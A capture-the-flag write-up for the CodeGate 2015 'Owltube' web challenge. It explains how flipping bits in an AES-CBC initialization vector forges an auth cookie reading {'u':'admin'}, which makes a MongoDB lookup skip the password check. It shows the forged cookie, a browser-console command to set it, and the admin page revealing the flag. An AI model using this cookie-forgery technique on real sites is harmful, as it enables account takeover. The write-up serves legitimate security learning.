# CodeGate General CTF 2015: Owltube

**Category:** Web
**Points:** 400
**Solves:** TODO
**Description:** 

> You're welcome to betatest our new social media site, it's going to be the next big thing.
> 
> Server : http://54.64.164.100:5555/
> Script : [http://binary.grayhash.com/2a0182588cf5550cebb49876d94c7a2f/index.py](index.py)
> 
> - option : please check the notice board.

## Write-up

The database seemed to be truncated every 15 minutes or so, and you can find out that the 'admin' username is taken whenever the database gets truncated.

The best possible case could be to try a sql injection based on the functionality of mongodb and python.
By reading the `index.py` script given from the ctf, you can see that the script encrypts the `auth` param in the cookie with AES-CBC encryption, which is vulnerable to padding attacks.

Moreover, if we think about the code `user = g.db.users.find_one(get_cookie())` and the outline of how mongodb works,
we can actually remove the password parameter and let the cookie have the username only in it.

The example is desribed as shown in below:
```
python: {"u":"username", "pw":"stypr"}
mongodb: SELECT * FROM (unknown) WHERE u='username' and pw='stypr'

python: {"u":"username"}
mongodb: SELECT * FROM (unknown) WHERE u='username'
```

Based on the things we kept in our mind, we just need to make the auth cookie to have `{"u":"admin"}\x03\x03\x03` as the plaintext, in order to be authenticated as admin.

```
- cbc padding vulnerability
    $ python
    ... (stripped - it does "plaintext xor iv xor fake_text" to create a fake iv) ...
    >>> print(base64.b64encode(malformed_iv+original_data))
        2zSNdk462MFkrqqwXK1Uut9d81nyZ7RGbV2q7PDX4uo=

- setting up the cookie (put this on a javascript console)
    document.cookie="auth=2zSNdk462MFkrqqwXK1Uut9d81nyZ7RGbV2q7PDX4uo;"

- the http response
    <h2>Logged in as admin</h2> 
    ...
    <span class="badge badge-important">1</span><span class="btn btn-link" onclick="play('the_owls_are_watching_again')">THIS IS THE KEY</span></br></br>
```


## Other write-ups and resources

* <https://0x1337seichi.wordpress.com/2015/03/15/codgate-2015-ctf-quals-owltube-writeup-web-400/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/blob/master/2015/CODEGATE/web/owltube/README.md>
* <https://github.com/pwning/public-writeup/blob/master/codegate2015/web400-owltube/writeup.md>
